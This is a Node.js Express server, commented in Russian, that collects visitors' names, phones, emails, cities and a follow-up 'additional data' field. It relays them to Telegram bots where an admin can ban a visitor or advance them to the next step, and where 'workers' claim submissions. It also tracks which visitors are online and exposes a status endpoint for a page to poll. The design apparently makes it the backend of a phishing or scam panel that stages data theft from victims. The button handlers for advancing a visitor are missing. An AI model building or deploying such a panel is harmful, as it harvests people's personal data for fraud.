const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТЫ =====
const mainBot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN, { polling: true });
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, { polling: true });

// ===== FIX 409 CONFLICT (Railway) =====
(async () => {
  try {
    await mainBot.deleteWebHook();
    await enterBot.deleteWebHook();
    await workerBot.deleteWebHook();
  } catch (e) {
    console.log("Webhook cleanup error:", e.message);
  }

  console.log("Bots initialized safely");
})();

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);

// ===== БАЗЫ =====
let bannedUsers = {};
let userStatus = {};
let seenUsers = {};
let onlineUsers = {};
let requestTexts = {};
let moderators = [];
let takenRequests = {}; // { id: { user, tgId } }

// ===== ФУНКЦИИ =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

function sendToAll(text, opts = {}) {
  mainBot.sendMessage(adminId, text, opts).catch(()=>{});
  moderators.forEach(m => {
    mainBot.sendMessage(m, text, opts).catch(()=>{});
  });
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  const text = `👀 Вход\n🆔 ${id}`;
  enterBot.sendMessage(adminId, text).catch(()=>{});
  moderators.forEach(m => enterBot.sendMessage(m, text).catch(()=>{}));

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ОСНОВНАЯ ЗАЯВКА =====
app.post("/send", (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  userStatus[id] = "wait";

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const text = `${statusText}

🆔 ID: ${id}

📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📧 ${d.email}
🏙 ${d.city}
💬 ${d.comment}`;

  requestTexts[id] = text;

  // ===== ГЛАВНЫЙ БОТ =====
  sendToAll(text, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
        [
          { text: "🚫 Бан", callback_data: "ban_" + id },
          { text: "✅ Разбан", callback_data: "unban_" + id }
        ],
        [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
      ]
    }
  });

  // ===== ВОРКЕР БОТ =====
  workerBot.sendMessage(workerChat, text, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  }).catch(()=>{});

  res.json({ ok: true, id });
});

// ===== ДОП ДАННЫЕ =====
app.post("/send2", (req, res) => {
  const data = req.body;
  if (!data.id) return res.json({ ok: false });

  const msg = `📩 ДОП ДАННЫЕ

🆔 ${data.id}
💬 ${data.value}`;

  sendToAll(msg);
  workerBot.sendMessage(workerChat, msg).catch(()=>{});

  res.json({ ok: true });
});

// ===== СТАТУС =====
app.get("/status/:id", (req, res) => {
  res.json({ status: userStatus[req.params.id] || "wait" });
});

// ===== CALLBACK ВОРКЕР БОТА =====
workerBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return workerBot.answerCallbackQuery(q.id, {
        text: "❌ Уже занято"
      });
    }

    const user = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    takenRequests[id] = {
      user,
      tgId: q.from.id
    };

    const newText = `${requestTexts[id]}

👤 Взял: ${user}`;

    try {
      await workerBot.editMessageText(newText, {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔓 Освободить", callback_data: "free_" + id }]
          ]
        }
      });
    } catch {}

    workerBot.answerCallbackQuery(q.id, {
      text: "✅ Ты забрал заявку"
    });
  }

  if (data.startsWith("free")) {

    if (!takenRequests[id]) return;

    if (takenRequests[id].tgId !== q.from.id) {
      return workerBot.answerCallbackQuery(q.id, {
        text: "❌ Не твоя заявка"
      });
    }

    delete takenRequests[id];

    try {
      await workerBot.editMessageText(requestTexts[id], {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "📥 Забрать", callback_data: "take_" + id }]
          ]
        }
      });
    } catch {}

    workerBot.answerCallbackQuery(q.id, {
      text: "🔓 Освобождено"
    });
  }
});

// ===== СЕРВЕР =====
app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
